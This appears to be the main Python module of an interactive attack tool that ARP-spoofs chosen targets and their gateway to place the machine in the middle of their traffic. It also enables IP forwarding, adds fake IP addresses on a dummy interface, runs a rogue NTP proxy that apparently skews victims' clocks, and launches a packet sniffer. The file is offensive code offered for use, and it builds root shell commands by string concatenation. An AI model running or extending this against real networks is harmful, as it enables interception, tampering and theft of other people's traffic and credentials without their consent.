import _thread
import socket
import os
import spoofer
import time
from menu import bcolors
from ntp import NTProxy
import menu
import sniff
import values


def toggleIpforward(v):
    """
    Toggle ip forward in /proc/sys/net/ipv4/ip_forward
    :param v:
    :return:
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        if v.ipForward:
                print(0, file=f)
                v.ipForward = False
        else:
                print(1, file=f)
                v.ipForward = True
    return


def validIPAddress(ip):
    """
    Checks if it's a valid IP
    :param ip:
    :return:
    """
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def cls():
    """
    clears console
    :return:
    """
    os.system("clear")
    return


def getIp(name):
    """
    Returns ip from hostname
    :param name:
    :return:
    """
    tmp = []
    ips = socket.getaddrinfo(socket.gethostbyname(name), None)
    for x in ips:
        tmp.append(x[4][0])

    return tmp


def getGwIp(target):
    """
    Gets the gateway ip address assuming netmask 255.255.255.0
    :param target:
    :return:
    """
    tmp = target.split('.')
    try:
        gw = (tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1")
    except IndexError:
        print(bcolors.FAIL + "      Invalid IP provided: " + target + bcolors.ENDC)
        return False
    return gw


def removeTargets(v):
    """
    Remove target from object vals
    :param v:
    :return:
    """
    if v.spoof:
        print("      " + bcolors.WARNING + "Turn off spoofer first" + bcolors.ENDC)
        time.sleep(1)
        return

    menu.menuBanner(v)
    if len(v.targets) > 0:
        i = 1
        for x in v.targets:
            print(f"      {i} - {x}")
            i += 1
        print(f"      {i} - ALL")
    else:
        print("      " + bcolors.WARNING + "No targets" + bcolors.ENDC)
        time.sleep(1)
        return

    try:
        sel = int(input("      Enter selection you want to delete: ")) - 1
    except ValueError:
        print("      " + bcolors.WARNING + "Only input integers" + bcolors.ENDC)
        time.sleep(1)
        return
    except KeyboardInterrupt:
        return

    if not 0 <= sel < i:
        print("      " + bcolors.WARNING + str(sel + 1) + " is not a selection" + bcolors.ENDC)
        time.sleep(1)
        return

    if sel == len(v.targets):
        v.targets = []
    elif sel == 0:
        print("      " + bcolors.WARNING + "Default gateway removed, removing all targets" + bcolors.ENDC)
        v.targets = []
        time.sleep(2)
    else:
        v.targets.pop(sel)

    return


def removeFake(v):
    """
    Removes fake ips that have been setup
    :param v:
    :return:
    """

    if len(v.fakes) > 0:
        menu.menuBanner(v)
        i = 1
        for x in v.fakes:
            print(f"      {i} - {x}")
            i += 1
        print(f"      {i} - ALL")
        try:
            sel = int(input("      Enter selection you want to delete: ")) - 1
        except ValueError:
            print("      " + bcolors.WARNING + "Only input integers" + bcolors.ENDC)
            time.sleep(1)
            return
        except KeyboardInterrupt:
            return

        if not 0 <= sel < i:
            print("      " + bcolors.WARNING + str(sel + 1) + " is not a selection" + bcolors.ENDC)
            time.sleep(1)
            return

        if sel == len(v.fakes):
            v.fakes = []
            return


        bash = ("ip addr del  " + v.fakes[sel] + "/0 dev dummy label dummy:" + str(sel))
        os.system(bash)
        v.fakes.pop(sel)
        return
    else:
        print("      " + bcolors.WARNING + "No fake NICs" + bcolors.ENDC)
        time.sleep(1)
        return


def startSpoof(v):
    """
    Starts arpspoofing
    :param v:
    :return:
    """
    if len(v.targets) < 2:
        print("      " + bcolors.WARNING + "Not enough targets" + bcolors.ENDC)
        time.sleep(1)
        return

    gw = v.targets[0]
    hgw = v.macs[0]
    j = 1
    if v.spoof:
        print("      " + bcolors.WARNING + "Already Spoofing" + bcolors.ENDC)
        time.sleep(1)
    v.spoof = True
    for x in v.targets[1:]:
        _thread.start_new_thread(spoofer.thread_spoof, (x, gw, v.macs[j], hgw, v))
        j += 1
    return


def restoreSpoof(v):
    """
    Restores arpspoofing
    :param v:
    :return:
    """
    gw = v.targets[0]
    hgw = v.macs[0]
    v.spoof = False
    j = 1
    for x in v.targets[1:]:
        spoofer.restore(x, gw, v.macs[j], hgw)
        spoofer.restore(gw, x, v.macs[j], hgw)
    return


def addFakes(v):
    """
    adds fake ip to object vals
    :param v:
    :return:
    """
    try:
        fakes = input("      Enter IP addresses separated with a space: ")
    except KeyboardInterrupt:
        return

    fakes = fakes.split(" ")
    tmp = True

    for x in fakes:
        if validIPAddress(x):
            bash = ("ip addr add " + x + "/0 dev dummy label dummy:" + str(len(v.fakes)))
            os.system(bash)
            if len(v.fakes) == 0:
                v.fakes.append(x)
            else:
                for y in v.fakes:
                    if y == x:
                        tmp = False

                if tmp:
                    v.fakes.append(x)
                else:
                    print("      " + bcolors.WARNING + x + " already in list" + bcolors.ENDC)
                    tmp = True
                    time.sleep(1)

        else:
            print("      " + bcolors.WARNING + x + " is not a valid IP" + bcolors.ENDC)
            time.sleep(1)

    return


def addTargets(v):
    """
    Adds target to object vals
    :param v:
    :return:
    """
    if v.spoof:
        print("      " + bcolors.WARNING + "Turn off spoofer first" + bcolors.ENDC)
        time.sleep(1)
        return
    try:
        target = input("      Enter IP address of targets separated with spaces: ")
    except KeyboardInterrupt:
        return

    target = target.split(" ")

    if len(v.targets) == 0:
        try:
            gw = input("      Enter IP address of router (leave blank if same subnet): ")
        except KeyboardInterrupt:
            return
        if validIPAddress(gw):
            tmp = spoofer.get_mac(gw)
            if tmp:
                v.targets.append(gw)
                v.macs.append(tmp)
            else:
                print("      " + bcolors.WARNING + "Did not add " + gw + " since no mac address found" + bcolors.ENDC)
                time.sleep(2)
                return
        else:
            gw = getGwIp(target[0])
            if gw:
                tmp = spoofer.get_mac(gw)
                if tmp:
                    v.targets.append(gw)
                    v.macs.append(tmp)
            else:
                if gw:
                    print("      " + bcolors.WARNING + "Did not add " + gw + " since no mac address found" + bcolors.ENDC)
                time.sleep(1)
                return

    for x in target:
        if validIPAddress(x):
            tmp = spoofer.get_mac(x)
            if tmp:
                v.targets.append(x)
                v.macs.append(x)
            else:
                print("      " + bcolors.WARNING + "Did not add " + x + " since no mac address found" + bcolors.ENDC)
                time.sleep(1)
        else:
            print("      " + bcolors.WARNING + x + " is not a valid ip address" + bcolors.ENDC)
            time.sleep(1)

    return


def interrupt(v):
    """
    Restores everything to base settings
    :param v:
    :return:
    """
    print("    " + bcolors.OKBLUE + "[!] Detected CTRL+C ! restoring setting, please wait..." + bcolors.ENDC)
    bash = "ip link delete dummy type dummy"
    os.system(bash)
    if v.spoof:
        restoreSpoof(v)
    if v.ntpStatus:
        ntpToggle(v)
    print("      " + bcolors.OKGREEN + "Done")
    print("      --------------------------------------------------------" + bcolors.ENDC)
    exit()


def setup():

    v = values.Values()

    if "nt" in os.name:
        print(bcolors.FAIL + "Can only run on a unix system" + bcolors.ENDC)
        exit()
    elif os.getuid() != 0:
        print(bcolors.FAIL + "Run this application as root" + bcolors.ENDC)
        exit()

    for x in v.targets:
        y = spoofer.get_mac(x)
        if y:
            v.macs.append(y)
        else:
            print("      " + bcolors.FAIL + str(x) + " Invalid IP in json" + bcolors.ENDC)
            exit()

    bash = "modprobe dummy && ip link add dummy type dummy"
    os.system(bash)
    toggleIpforward(v)
    i = 0
    for x in v.fakes:
        bash = ("ip addr add " + x + "/0 dev dummy label dummy:" + str(i))
        os.system(bash)
        i += 1

    return v


def ntpToggle(v):
    if v.ntpStatus:
        print("      " + bcolors.OKBLUE + "Working.." + bcolors.ENDC)
        v.ntpServer.stop()
        v.ntpServer.join()
        v.ntpSocket.close()
        v.ntpServer = ""
        v.ntpSocket = ""
        v.ntpStatus = False
    else:
        i = 1
        menu.menuBanner(v)
        for x in v.fakes:
            print(f"      {i} - {x}")
            i += 1
        print(f"      {i} - 0.0.0.0")
        try:
            sel = int(input("      Select ip that NTP server will be hosted on: ")) - 1
        except ValueError:
            print("      " + bcolors.WARNING + "Only input integers" + bcolors.ENDC)
            time.sleep(1)
            return
        except KeyboardInterrupt:
            return

        if not 0 <= sel < i:
            print("      " + bcolors.WARNING + str(sel + 1) + " is not a selection" + bcolors.ENDC)
            time.sleep(1)
            return

        v.ntpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if sel == len(v.fakes):
            v.ntpSocket.bind(("0.0.0.0", 123))
        else:
            v.ntpSocket.bind((v.fakes[sel], 123))
        v.ntpServer = NTProxy(v.ntpSocket)
        v.ntpServer.set_skim_threshold("30s")
        v.ntpServer.start()
        v.ntpStatus = True
    return


def toggleSniff(v):
    if v.sniff:
        v.sniff = False
        pass
    else:
        _thread.start_new_thread(sniff.sniffer, ())
        v.sniff = True

